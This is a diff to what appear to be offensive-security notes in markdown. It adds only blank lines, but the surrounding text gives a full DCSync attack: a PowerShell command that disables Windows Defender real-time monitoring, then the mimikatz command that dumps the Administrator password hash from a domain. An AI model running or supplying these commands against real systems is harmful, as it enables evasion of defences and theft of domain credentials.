@@ -13,9 +13,11 @@ You may need to disable Windows Defender
 Open up PowerShell as an administrator and type
 
 $ Set-MpPreference -DisableRealtimeMonitoring $true
+
 Start mimikatz
 
 $ lsadump::dcsync /domain:test.local /user:Administrator
+
 Now you have the password hash from that user
 
 This required that you have Administrator access, specifically the Get-Replication-Changes-All Common Name attribute
